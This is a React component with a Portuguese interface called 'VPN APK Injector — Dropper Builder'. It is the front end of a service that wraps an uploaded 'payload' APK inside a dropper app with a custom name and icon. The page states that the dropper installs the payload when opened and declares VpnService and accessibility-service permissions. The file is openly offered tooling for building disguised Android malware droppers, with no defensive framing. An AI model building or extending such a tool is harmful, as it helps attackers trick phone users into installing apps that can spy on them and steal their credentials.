import { useState, useRef, useCallback, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Upload,
  Shield,
  CheckCircle2,
  XCircle,
  Download,
  ImageIcon,
  Smartphone,
  Package,
  Loader2,
  ChevronDown,
  ChevronUp,
  Wifi,
  Lock,
  Cpu,
  X,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import { toast } from "sonner";

// ─── Tipos ────────────────────────────────────────────────────────────────────

type JobStatus = "idle" | "uploading" | "pending" | "processing" | "done" | "error";

interface DropperJobState {
  jobId: string | null;
  status: JobStatus;
  progress: number;
  log: string[];
  downloadUrl: string | null;
  appName: string | null;
  payloadName: string | null;
  errorMessage: string | null;
}

const INITIAL_STATE: DropperJobState = {
  jobId: null,
  status: "idle",
  progress: 0,
  log: [],
  downloadUrl: null,
  appName: null,
  payloadName: null,
  errorMessage: null,
};

function formatBytes(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function statusLabel(status: JobStatus): string {
  switch (status) {
    case "uploading": return "Enviando arquivos...";
    case "pending": return "Na fila de processamento...";
    case "processing": return "Construindo APK dropper...";
    case "done": return "APK dropper gerado com sucesso!";
    case "error": return "Erro no processamento";
    default: return "";
  }
}

// ─── Componente ───────────────────────────────────────────────────────────────

export default function DropperBuilder() {
  const [job, setJob] = useState<DropperJobState>(INITIAL_STATE);
  const [appName, setAppName] = useState("");
  const [apkFile, setApkFile] = useState<File | null>(null);
  const [iconFile, setIconFile] = useState<File | null>(null);
  const [iconPreview, setIconPreview] = useState<string | null>(null);
  const [isDraggingApk, setIsDraggingApk] = useState(false);
  const [showFullLog, setShowFullLog] = useState(false);

  const apkInputRef = useRef<HTMLInputElement>(null);
  const iconInputRef = useRef<HTMLInputElement>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  useEffect(() => {
    if (showFullLog) logEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [job.log, showFullLog]);

  // ── Polling ────────────────────────────────────────────────────────────────

  const startPolling = useCallback((jobId: string) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/dropper/status/${jobId}`);
        if (!res.ok) return;
        const data = await res.json();
        setJob((prev) => ({
          ...prev,
          status: data.status as JobStatus,
          progress: data.progress,
          log: data.log || [],
          downloadUrl: data.downloadUrl,
          errorMessage: data.errorMessage,
          appName: data.appName || prev.appName,
          payloadName: data.payloadName || prev.payloadName,
        }));
        if (data.status === "done" || data.status === "error") {
          if (pollRef.current) clearInterval(pollRef.current);
          if (data.status === "done") {
            toast.success("APK dropper gerado!", { description: "Clique em Download para baixar." });
          } else {
            toast.error("Erro no build", { description: data.errorMessage || "Tente novamente." });
          }
        }
      } catch { /* silencioso */ }
    }, 1500);
  }, []);

  // ── Ícone ──────────────────────────────────────────────────────────────────

  const handleIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (!file.type.startsWith("image/")) {
      toast.error("Arquivo inválido", { description: "Envie uma imagem PNG, JPG ou WEBP." });
      return;
    }
    setIconFile(file);
    const reader = new FileReader();
    reader.onload = (ev) => setIconPreview(ev.target?.result as string);
    reader.readAsDataURL(file);
    e.target.value = "";
  };

  const removeIcon = () => {
    setIconFile(null);
    setIconPreview(null);
  };

  // ── APK drag & drop ────────────────────────────────────────────────────────

  const onApkDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDraggingApk(false);
    const file = e.dataTransfer.files[0];
    if (file) {
      if (!file.name.toLowerCase().endsWith(".apk")) {
        toast.error("Arquivo inválido", { description: "Apenas arquivos .apk são aceitos." });
        return;
      }
      setApkFile(file);
    }
  }, []);

  // ── Submit ─────────────────────────────────────────────────────────────────

  const handleBuild = useCallback(async () => {
    if (!apkFile) {
      toast.error("APK necessário", { description: "Selecione o APK alvo primeiro." });
      return;
    }
    if (!appName.trim()) {
      toast.error("Nome necessário", { description: "Defina o nome do app dropper." });
      return;
    }

    setJob({ ...INITIAL_STATE, status: "uploading", appName: appName.trim(), payloadName: apkFile.name });
    setShowFullLog(false);

    const formData = new FormData();
    formData.append("apk", apkFile);
    formData.append("appName", appName.trim());
    if (iconFile) formData.append("icon", iconFile);

    try {
      const res = await fetch("/api/dropper/build", { method: "POST", body: formData });
      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.error || "Falha no upload");
      }
      const { jobId } = await res.json();
      setJob((prev) => ({ ...prev, jobId, status: "pending", progress: 5 }));
      startPolling(jobId);
    } catch (err) {
      setJob((prev) => ({ ...prev, status: "error", errorMessage: (err as Error).message }));
      toast.error("Falha no build", { description: (err as Error).message });
    }
  }, [apkFile, appName, iconFile, startPolling]);

  const handleDownload = () => {
    if (!job.jobId) return;
    const link = document.createElement("a");
    link.href = `/api/dropper/download/${job.jobId}`;
    link.download = (job.appName || "dropper").replace(/[^a-zA-Z0-9]/g, "_") + "_dropper.apk";
    link.click();
  };

  const handleReset = () => {
    if (pollRef.current) clearInterval(pollRef.current);
    setJob(INITIAL_STATE);
    setApkFile(null);
    setIconFile(null);
    setIconPreview(null);
    setAppName("");
    setShowFullLog(false);
  };

  const isProcessing = ["uploading", "pending", "processing"].includes(job.status);
  const isIdle = job.status === "idle";

  // ─── Render ────────────────────────────────────────────────────────────────

  return (
    <div className="min-h-screen bg-background bg-grid-pattern relative overflow-hidden">
      {/* Glow */}
      <div
        className="pointer-events-none absolute inset-0"
        style={{ background: "radial-gradient(ellipse 80% 50% at 50% -10%, oklch(0.72 0.18 175 / 0.08), transparent)" }}
      />

      <div className="relative z-10 flex flex-col min-h-screen">
        {/* Header */}
        <header className="border-b border-border/50 backdrop-blur-sm bg-background/60 sticky top-0 z-20">
          <div className="container flex items-center justify-between h-16">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-lg bg-primary/10 border border-primary/30 flex items-center justify-center">
                <Shield className="w-4 h-4 text-primary" />
              </div>
              <div>
                <span className="font-semibold text-foreground tracking-tight">VPN APK Injector</span>
                <span className="ml-2 text-xs text-muted-foreground font-mono bg-muted px-1.5 py-0.5 rounded">v1.0</span>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <a
                href="/"
                className="text-xs text-muted-foreground hover:text-primary transition-colors font-medium"
              >
                ← APK Injector
              </a>
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <div className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse" />
                Dropper Builder
              </div>
            </div>
          </div>
        </header>

        <main className="flex-1 container py-12 flex flex-col items-center gap-10">

          {/* Hero */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, ease: [0.23, 1, 0.32, 1] }}
            className="text-center max-w-2xl"
          >
            <h1 className="text-4xl font-bold tracking-tight text-foreground mb-3">
              Gere um{" "}
              <span className="text-primary">APK Dropper</span>{" "}
              personalizado
            </h1>
            <p className="text-muted-foreground text-lg leading-relaxed">
              Configure o nome, ícone e o APK alvo. O painel gera um dropper completo com{" "}
              <code className="text-primary font-mono text-sm bg-primary/10 px-1.5 py-0.5 rounded">VpnService</code>{" "}
              e{" "}
              <code className="text-primary font-mono text-sm bg-primary/10 px-1.5 py-0.5 rounded">BIND_ACCESSIBILITY_SERVICE</code>{" "}
              embutidos.
            </p>
          </motion.div>

          {/* Badges */}
          <motion.div
            initial={{ opacity: 0, y: 16 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.1, ease: [0.23, 1, 0.32, 1] }}
            className="flex flex-wrap justify-center gap-3"
          >
            {[
              { icon: Smartphone, label: "Nome personalizado" },
              { icon: ImageIcon, label: "Ícone customizado" },
              { icon: Package, label: "Payload embutido" },
              { icon: Wifi, label: "VpnService injetado" },
              { icon: Lock, label: "Acessibilidade" },
              { icon: Cpu, label: "APK assinado" },
            ].map(({ icon: Icon, label }) => (
              <div key={label} className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-card border border-border text-xs text-muted-foreground">
                <Icon className="w-3.5 h-3.5 text-primary" />
                {label}
              </div>
            ))}
          </motion.div>

          {/* Formulário ou card de progresso */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.15, ease: [0.23, 1, 0.32, 1] }}
            className="w-full max-w-2xl"
          >
            <AnimatePresence mode="wait">
              {isIdle ? (
                <motion.div
                  key="form"
                  initial={{ opacity: 0, scale: 0.97 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.97 }}
                  transition={{ duration: 0.25, ease: [0.23, 1, 0.32, 1] }}
                  className="rounded-2xl border border-border bg-card overflow-hidden"
                >
                  <div className="p-6 border-b border-border/50">
                    <h2 className="font-semibold text-foreground text-base">Configurar Dropper</h2>
                    <p className="text-xs text-muted-foreground mt-1">Preencha os campos abaixo para gerar seu APK dropper</p>
                  </div>

                  <div className="p-6 space-y-6">

                    {/* Nome do app */}
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-foreground flex items-center gap-2">
                        <Smartphone className="w-4 h-4 text-primary" />
                        Nome do App Dropper
                        <span className="text-destructive">*</span>
                      </label>
                      <Input
                        value={appName}
                        onChange={(e) => setAppName(e.target.value)}
                        placeholder="Ex: Meu Aplicativo"
                        maxLength={64}
                        className="bg-background/50 border-border focus:border-primary h-11"
                      />
                      <p className="text-xs text-muted-foreground">
                        Este nome aparecerá na tela inicial do Android · {appName.length}/64
                      </p>
                    </div>

                    {/* Ícone */}
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-foreground flex items-center gap-2">
                        <ImageIcon className="w-4 h-4 text-primary" />
                        Ícone do App
                        <span className="text-xs text-muted-foreground font-normal">(opcional)</span>
                      </label>
                      <div className="flex items-center gap-4">
                        {iconPreview ? (
                          <div className="relative">
                            <img
                              src={iconPreview}
                              alt="Ícone"
                              className="w-16 h-16 rounded-2xl object-cover border border-border shadow-lg"
                            />
                            <button
                              onClick={removeIcon}
                              className="absolute -top-2 -right-2 w-5 h-5 rounded-full bg-destructive flex items-center justify-center text-white hover:bg-destructive/80 transition-colors"
                            >
                              <X className="w-3 h-3" />
                            </button>
                          </div>
                        ) : (
                          <div
                            onClick={() => iconInputRef.current?.click()}
                            className="w-16 h-16 rounded-2xl border-2 border-dashed border-border hover:border-primary/50 bg-card/50 hover:bg-card flex items-center justify-center cursor-pointer transition-all"
                          >
                            <ImageIcon className="w-6 h-6 text-muted-foreground" />
                          </div>
                        )}
                        <div className="flex-1">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => iconInputRef.current?.click()}
                            className="text-xs gap-2"
                          >
                            <Upload className="w-3.5 h-3.5" />
                            {iconPreview ? "Trocar ícone" : "Selecionar ícone"}
                          </Button>
                          <p className="text-xs text-muted-foreground mt-1.5">
                            PNG, JPG ou WEBP · Recomendado 512×512px
                          </p>
                          {iconFile && (
                            <p className="text-xs text-primary font-mono mt-1">
                              {iconFile.name} · {formatBytes(iconFile.size)}
                            </p>
                          )}
                        </div>
                      </div>
                      <input
                        ref={iconInputRef}
                        type="file"
                        accept="image/png,image/jpeg,image/webp"
                        className="hidden"
                        onChange={handleIconChange}
                      />
                    </div>

                    {/* APK alvo */}
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-foreground flex items-center gap-2">
                        <Package className="w-4 h-4 text-primary" />
                        APK Alvo (Payload)
                        <span className="text-destructive">*</span>
                      </label>
                      <div
                        onDrop={onApkDrop}
                        onDragOver={(e) => { e.preventDefault(); setIsDraggingApk(true); }}
                        onDragLeave={() => setIsDraggingApk(false)}
                        onClick={() => apkInputRef.current?.click()}
                        className={`
                          relative cursor-pointer rounded-xl border-2 border-dashed transition-all duration-200
                          flex items-center gap-4 p-4
                          ${isDraggingApk
                            ? "border-primary bg-primary/5"
                            : apkFile
                            ? "border-primary/40 bg-primary/5"
                            : "border-border hover:border-primary/50 hover:bg-card/50 bg-card/30"
                          }
                        `}
                      >
                        <div className={`w-10 h-10 rounded-lg flex items-center justify-center shrink-0 ${apkFile ? "bg-primary/15" : "bg-card border border-border"}`}>
                          <Package className={`w-5 h-5 ${apkFile ? "text-primary" : "text-muted-foreground"}`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          {apkFile ? (
                            <>
                              <p className="text-sm font-medium text-foreground truncate">{apkFile.name}</p>
                              <p className="text-xs text-muted-foreground">{formatBytes(apkFile.size)}</p>
                            </>
                          ) : (
                            <>
                              <p className="text-sm text-foreground">
                                {isDraggingApk ? "Solte o APK aqui" : "Arraste ou clique para selecionar"}
                              </p>
                              <p className="text-xs text-muted-foreground">Apenas .apk · Máximo 200 MB</p>
                            </>
                          )}
                        </div>
                        {apkFile && (
                          <button
                            onClick={(e) => { e.stopPropagation(); setApkFile(null); }}
                            className="shrink-0 w-6 h-6 rounded-full bg-muted hover:bg-destructive/20 flex items-center justify-center transition-colors"
                          >
                            <X className="w-3.5 h-3.5 text-muted-foreground" />
                          </button>
                        )}
                      </div>
                      <input
                        ref={apkInputRef}
                        type="file"
                        accept=".apk,application/vnd.android.package-archive"
                        className="hidden"
                        onChange={(e) => {
                          const f = e.target.files?.[0];
                          if (f) setApkFile(f);
                          e.target.value = "";
                        }}
                      />
                    </div>

                    {/* Botão de build */}
                    <Button
                      onClick={handleBuild}
                      disabled={!apkFile || !appName.trim()}
                      className="w-full h-12 text-sm font-semibold gap-2.5 rounded-xl transition-all"
                      style={
                        apkFile && appName.trim()
                          ? {
                              background: "oklch(0.72 0.18 175)",
                              color: "oklch(0.09 0.01 260)",
                              boxShadow: "0 0 24px oklch(0.72 0.18 175 / 0.35)",
                            }
                          : {}
                      }
                    >
                      <Cpu className="w-4 h-4" />
                      Gerar APK Dropper
                    </Button>
                  </div>
                </motion.div>
              ) : (
                // Card de progresso
                <motion.div
                  key="progress"
                  initial={{ opacity: 0, scale: 0.97 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.97 }}
                  transition={{ duration: 0.3, ease: [0.23, 1, 0.32, 1] }}
                  className="rounded-2xl border border-border bg-card overflow-hidden"
                >
                  {/* Header */}
                  <div className="px-6 pt-6 pb-4 border-b border-border/50">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${job.status === "done" ? "bg-primary/15" : job.status === "error" ? "bg-destructive/15" : "bg-primary/10"}`}>
                          {job.status === "done" ? (
                            <CheckCircle2 className="w-5 h-5 text-primary" />
                          ) : job.status === "error" ? (
                            <XCircle className="w-5 h-5 text-destructive" />
                          ) : (
                            <Loader2 className="w-5 h-5 text-primary animate-spin" />
                          )}
                        </div>
                        <div>
                          <p className="font-semibold text-foreground text-sm">{job.appName}</p>
                          <p className="text-xs text-muted-foreground">{job.payloadName}</p>
                        </div>
                      </div>
                      {!isProcessing && (
                        <Button variant="ghost" size="sm" onClick={handleReset} className="text-muted-foreground hover:text-foreground text-xs">
                          Novo dropper
                        </Button>
                      )}
                    </div>
                  </div>

                  {/* Progresso */}
                  <div className="px-6 py-5">
                    <div className="flex items-center justify-between mb-2">
                      <span className={`text-sm font-medium ${job.status === "done" ? "text-primary" : job.status === "error" ? "text-destructive" : "text-foreground"}`}>
                        {statusLabel(job.status)}
                      </span>
                      <span className="text-xs font-mono text-muted-foreground">{job.progress}%</span>
                    </div>
                    <Progress
                      value={job.progress}
                      className={`h-2 ${job.status === "error" ? "[&>div]:bg-destructive" : "[&>div]:bg-primary"} ${isProcessing ? "animate-progress-glow" : ""}`}
                    />
                  </div>

                  {/* Log */}
                  {job.log.length > 0 && (
                    <div className="px-6 pb-6">
                      <button
                        onClick={() => setShowFullLog((v) => !v)}
                        className="flex items-center gap-2 text-xs text-muted-foreground hover:text-foreground transition-colors mb-3 w-full"
                      >
                        <div className="flex-1 h-px bg-border" />
                        <span className="flex items-center gap-1.5 shrink-0">
                          {showFullLog ? <><ChevronUp className="w-3.5 h-3.5" /> Ocultar log</> : <><ChevronDown className="w-3.5 h-3.5" /> Ver log ({job.log.length} linhas)</>}
                        </span>
                        <div className="flex-1 h-px bg-border" />
                      </button>

                      <AnimatePresence>
                        {showFullLog && (
                          <motion.div
                            initial={{ height: 0, opacity: 0 }}
                            animate={{ height: "auto", opacity: 1 }}
                            exit={{ height: 0, opacity: 0 }}
                            transition={{ duration: 0.25, ease: [0.23, 1, 0.32, 1] }}
                            className="overflow-hidden"
                          >
                            <div className="rounded-xl bg-background/80 border border-border/50 p-4 max-h-64 overflow-y-auto">
                              <div className="space-y-1">
                                {job.log.map((line, i) => (
                                  <motion.p key={i} initial={{ opacity: 0, x: -8 }} animate={{ opacity: 1, x: 0 }} transition={{ duration: 0.2, delay: i * 0.02 }} className="text-xs font-mono text-muted-foreground leading-relaxed">
                                    {line}
                                  </motion.p>
                                ))}
                                <div ref={logEndRef} />
                              </div>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>

                      {/* Resumo de sucesso */}
                      {job.status === "done" && (
                        <motion.div
                          initial={{ opacity: 0, y: 8 }}
                          animate={{ opacity: 1, y: 0 }}
                          transition={{ duration: 0.3, ease: [0.23, 1, 0.32, 1] }}
                          className="mt-4 rounded-xl border border-primary/20 bg-primary/5 p-4"
                        >
                          <p className="text-xs font-semibold text-primary mb-2 flex items-center gap-1.5">
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            Dropper gerado com sucesso
                          </p>
                          <div className="space-y-1.5">
                            {[
                              { icon: Smartphone, label: "Nome do app", sub: job.appName || "" },
                              { icon: Package, label: "Payload embutido", sub: job.payloadName || "" },
                              { icon: Wifi, label: "VpnService declarado", sub: "android.net.VpnService" },
                              { icon: Lock, label: "Acessibilidade declarada", sub: "BIND_ACCESSIBILITY_SERVICE" },
                              { icon: Cpu, label: "APK assinado", sub: "RSA-2048 / SHA-256 debug key" },
                            ].map(({ icon: Icon, label, sub }) => (
                              <div key={label} className="flex items-start gap-2">
                                <Icon className="w-3.5 h-3.5 text-primary mt-0.5 shrink-0" />
                                <div>
                                  <p className="text-xs text-foreground font-medium">{label}</p>
                                  <p className="text-xs text-muted-foreground font-mono truncate max-w-xs">{sub}</p>
                                </div>
                              </div>
                            ))}
                          </div>
                        </motion.div>
                      )}

                      {/* Erro */}
                      {job.status === "error" && job.errorMessage && (
                        <motion.div
                          initial={{ opacity: 0, y: 8 }}
                          animate={{ opacity: 1, y: 0 }}
                          className="mt-4 rounded-xl border border-destructive/20 bg-destructive/5 p-4"
                        >
                          <p className="text-xs font-semibold text-destructive mb-1 flex items-center gap-1.5">
                            <XCircle className="w-3.5 h-3.5" />
                            Detalhes do erro
                          </p>
                          <p className="text-xs font-mono text-muted-foreground">{job.errorMessage}</p>
                        </motion.div>
                      )}
                    </div>
                  )}

                  {/* Download */}
                  {job.status === "done" && (
                    <motion.div
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.35, ease: [0.23, 1, 0.32, 1] }}
                      className="px-6 pb-6"
                    >
                      <Button
                        onClick={handleDownload}
                        className="w-full h-12 text-sm font-semibold gap-2.5 rounded-xl"
                        style={{
                          background: "oklch(0.72 0.18 175)",
                          color: "oklch(0.09 0.01 260)",
                          boxShadow: "0 0 24px oklch(0.72 0.18 175 / 0.35)",
                        }}
                      >
                        <Download className="w-4.5 h-4.5" />
                        Baixar APK Dropper
                      </Button>
                    </motion.div>
                  )}

                  {/* Tentar novamente */}
                  {job.status === "error" && (
                    <div className="px-6 pb-6">
                      <Button onClick={handleReset} variant="outline" className="w-full h-12 text-sm font-semibold gap-2 rounded-xl">
                        <Upload className="w-4 h-4" />
                        Tentar novamente
                      </Button>
                    </div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>

          {/* Info cards */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.25, ease: [0.23, 1, 0.32, 1] }}
            className="w-full max-w-2xl grid grid-cols-1 sm:grid-cols-3 gap-4"
          >
            {[
              { icon: Smartphone, title: "Nome personalizado", desc: "Defina o nome que aparece na tela inicial e nas configurações do Android" },
              { icon: ImageIcon, title: "Ícone customizado", desc: "Envie qualquer imagem como ícone — o painel gera todas as densidades automaticamente" },
              { icon: Package, title: "Payload embutido", desc: "O APK alvo fica embutido dentro do dropper como asset e é instalado ao abrir" },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="rounded-xl border border-border bg-card/50 p-4 flex flex-col gap-2">
                <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
                  <Icon className="w-4 h-4 text-primary" />
                </div>
                <p className="text-sm font-semibold text-foreground">{title}</p>
                <p className="text-xs text-muted-foreground leading-relaxed">{desc}</p>
              </div>
            ))}
          </motion.div>
        </main>

        {/* Footer */}
        <footer className="border-t border-border/50 py-6">
          <div className="container flex items-center justify-center gap-2 text-xs text-muted-foreground">
            <Shield className="w-3.5 h-3.5 text-primary/60" />
            <span>VPN APK Injector — Dropper Builder</span>
          </div>
        </footer>
      </div>
    </div>
  );
}
